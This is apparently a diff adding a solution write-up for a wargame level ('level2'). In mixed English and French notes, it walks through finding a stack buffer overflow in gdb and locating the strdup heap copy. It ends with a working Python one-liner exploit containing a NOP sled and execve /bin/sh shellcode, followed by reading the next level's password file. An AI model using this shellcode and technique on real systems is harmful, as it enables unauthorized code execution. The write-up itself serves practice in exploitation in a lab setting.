@@ -1,0 +1,75 @@
+#the executable use a function called p
+it has a loop with a printf
+
+if we overpass this loop we can printf the address of var_ch
+&var_ch = (0x804854a)
+
+#with test of overflow
+64 A to 68 A -> bug
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+x /8x 0x804854a
+=> the first 4 bits are modified
+aka 4 buggy char
+=>it must be the 4bits var_ch who is an int32_t
+
+#we try to see what is in this var
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234
+x /8x 0x804854a
+
+#their is smth strange
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEAAAAAAAAAAAABCDE
+
+saved eip 0x45444342 aka BCDE
+=> so the return address is copied somewhere in the memory
+
+#we see that arg4h is at ebp+0x4
+info frame => ebp is at 0xbffff728
+x /4x 0xbffff72c
+=> we got 0x45444342 aka BCDE
+so BCDE is in arg4h
+
+#ebp is 0xbffff728
+#so src is at : ebp-0x4c
+#src is 0xbffff6dc
+
+
+//remonter assez loin pour changer l'adresse du jmp
+//strdup COPIE notre buffer sur une autre adresse mémoire que 0xbffff6dc.
+//Il faut donc remplacer l'adresse de sortie par cette nouvelle adresse, dépourvue de b (on skip donc le if)
+//Adresses trouvés dans le disass de strdup :
+
+// 0x08049844
+// \x44\x98\x04\x08
+
+//0x080483e6
+// \xe6\x83\x04\x08
+
+//0x080483eb
+// \xeb\x83\x04\x08
+
+//0x080483e6
+// \xe6\x83\x04\x08
+
+//0x001282b8
+// \xb8\x82\x12\x00
+
+//0x0804982c
+// \x2c\x98\x04\x08
+
+(python -c "print 'A'*80 + '\x2c\x98\x04\x08' + '\x90'*30 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'";cat) | ./level2
+=> gdb nous donne la valeur de retour de strdup qui est l'endroit où se trouve notre buffer
+0x804a008 => 0x0804a008
+
+cette adresse + 96 caracters (16 * 6)= 0x0804a068
+
+soit  0x68 0xa0 0x04 0x08
+
+essayons donc avec cette adresse :
+(python -c "print 'A'*80 + '\x08\xa0\x04\x08' + '\x90'*30 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'";cat) | ./level2
+
+=> on ouvre un terminal
+
+cd ../level3
+cat .pass
+=> password
